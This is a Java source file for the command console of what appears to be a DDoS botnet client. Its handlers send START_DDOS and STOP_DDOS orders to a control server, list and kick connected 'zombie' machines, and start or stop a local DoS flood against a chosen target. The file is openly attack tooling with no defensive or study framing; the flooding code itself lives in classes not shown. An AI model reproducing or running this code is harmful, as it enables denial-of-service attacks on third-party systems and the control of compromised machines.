package org.ddos.client.command;

import java.io.IOException;
import java.io.Serializable;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.util.ArrayList;
import java.util.regex.Pattern;

import org.ddos.client.DOS;
import org.ddos.network.ClientNetwork;
import org.ddos.util.Console;
import org.jcom.Command;
import org.jcom.CommandException;
import org.jcom.CommandJob;
import org.jcom.UnknownCommandException;
import org.jnetwork.DataPackage;

public class CommandActions {
	public static CommandJob getDdosAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					boolean start = command.getCommandArguments()[0].equals("start");
					if (start) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage(command.getCommandArguments()[1],
										command.hasFlag("-l") ? Integer.parseInt(command.getFlag("-l").getValue()) : 32,
										command.hasFlag("-t") ? Integer.parseInt(command.getFlag("-t").getValue()) : 1)
												.setMessage("START_DDOS"));
						System.out.println("Started DDoS attack on " + command.getCommandArguments()[1] + ".");
					} else {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage(command.getCommandArguments()[1]).setMessage("STOP_DDOS"));
						System.out.println("Stopped DDoS attack on " + command.getCommandArguments()[1] + ".");
					}
				} catch (IOException e) {
					e.printStackTrace();
				}
				return null;
			}
		};
	}

	public static CommandJob getKickAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				ArrayList<SocketAddress> addresses = new ArrayList<>();

				for (String addr : command.getCommandArguments()) {
					String[] split = addr.split(Pattern.quote(":"), 0);
					addresses.add(new InetSocketAddress(split[0], Integer.parseInt(split[1])));
				}
				try {
					ClientNetwork.getClient().getOutputStream()
							.writeObject(new DataPackage(
									(Serializable[]) addresses.toArray(new SocketAddress[addresses.size()]))
											.setMessage("KICK_ZOMBIES"));
				} catch (IOException e) {
					e.printStackTrace();
				}
				return null;

			}
		};
	}

	public static CommandJob getListZombiesAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					ClientNetwork.getClient().getOutputStream()
							.writeObject(new DataPackage().setMessage("LIST_ZOMBIES"));

					SocketAddress[] addresses = (SocketAddress[]) ((DataPackage) ClientNetwork.getClient()
							.getInputStream().readObject()).getObjects();
					Console.println("There are " + addresses.length + " zombie(s) connected.");

					for (SocketAddress address : addresses) {
						Console.println(address);
					}

					return addresses.length;
				} catch (IOException e) {
					e.printStackTrace();
				} catch (ClassNotFoundException e) {
					e.printStackTrace();
				} finally {
					return null;
				}
			}
		};
	}

	public static CommandJob getHelpForCommandAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command c) {
				try {
					Console.println(Commands.getHelpForAction(c.getCommandArguments()[0], c.getInterface()));
				} catch (UnknownCommandException e) {
					Console.println("Unknown command: " + c.getCommandArguments()[0]);
				}
				return null;

			}
		};
	}

	public static CommandJob getInvalidCommandAction(final String baseCommand) {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				Console.println(
						"Invalid command \"" + baseCommand + "\". Use the \"help\" command for a list of commands.");
				return null;
			}
		};
	}

	public static CommandJob getUniversalHelpAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command c) {
				Console.println("Commands: ");

				int largestCommandSize = 0;
				for (String command : c.getInterface().getAllCommandsNames())
					if (command.length() > largestCommandSize)
						largestCommandSize = command.length();

				for (String command : c.getInterface().getAllCommandsNames()) {
					Console.println("\t" + command);
				}
				Console.println("Type \"help <command>\" for help with a specific command.");
				return null;
			}
		};
	}

	public static CommandJob getExitAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				if (command.hasFlag("-k")) {
					try {
						command.getInterface().executeCommand("kick");
					} catch (CommandException e) {
						e.printStackTrace();
					}
				}

				System.exit(0);
				return null;
			}
		};
	}

	public static CommandJob getKickAllZombiesAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					ClientNetwork.getClient().getOutputStream()
							.writeObject(new DataPackage().setMessage("KICK_ALL_ZOMBIES"));
					try {
						Thread.sleep(1000); // prevent shutdown before object is
											// read if exit command has -k flag
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				} catch (IOException e) {
					e.printStackTrace();
				}

				return null;
			}
		};
	}

	public static CommandJob getDosAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				boolean start = command.getCommandArguments()[0].equals("start");

				if (start) {
					DOS.setArguments(command.getCommandArguments()[1],
							command.hasFlag("-l") ? Integer.parseInt(command.getFlag("-l").getValue()) : 32,
							command.hasFlag("-t") ? Integer.parseInt(command.getFlag("-t").getValue()) : 1);
					DOS.start();
					Console.println("Started DoS attack on " + command.getCommandArguments()[1] + ".");
				} else {
					DOS.stop();
					Console.println("Stopped DoS attack on " + command.getCommandArguments()[1] + ".");
				}

				return null;
			}
		};
	}

	public static CommandJob getWaitAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				Object monitor = new Object();
				synchronized (monitor) {
					try {
						monitor.wait();
					} catch (InterruptedException e) {
						// good! the user interrupted the thread
					}
				}

				return null;
			}
		};
	}

	public static CommandJob getWaitForMillisecondsAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					Thread.sleep(Long.parseLong(command.getCommandArguments()[0]));
				} catch (InterruptedException e) {
					// interrupted by user
				}

				return null;
			}
		};
	}
}